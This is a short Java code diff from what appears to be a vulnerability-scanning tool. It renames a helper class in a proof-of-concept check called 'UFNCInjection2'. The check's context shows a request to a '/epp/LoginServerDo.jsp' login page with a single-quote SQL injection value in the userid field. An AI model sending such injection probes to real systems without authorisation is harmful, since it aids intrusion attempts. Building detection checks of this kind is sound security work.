@@ -22,7 +22,7 @@ import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.util.EntityUtils;
 
-import cn.com.sgcc.marki_with_maven.misc.Tools;
+import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;
 
 public class UFNCInjection2 implements IPocBase {
 
@@ -62,7 +62,7 @@ public class UFNCInjection2 implements IPocBase {
 		try {
 			String url = String.format("%s://%s:%s/epp/LoginServerDo.jsp?userid=1'&pwd=1", serviceType.contains("https") ? "https":"http", ip, port );
 			HttpGet httpGet = new HttpGet(url);
-			customClient = new Tools().getCustomAutoRedirectClient();
+			customClient = new NetWorkTools().getCustomAutoRedirectClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
 			if ( resp.getStatusLine().getStatusCode() == 404 )
 			{
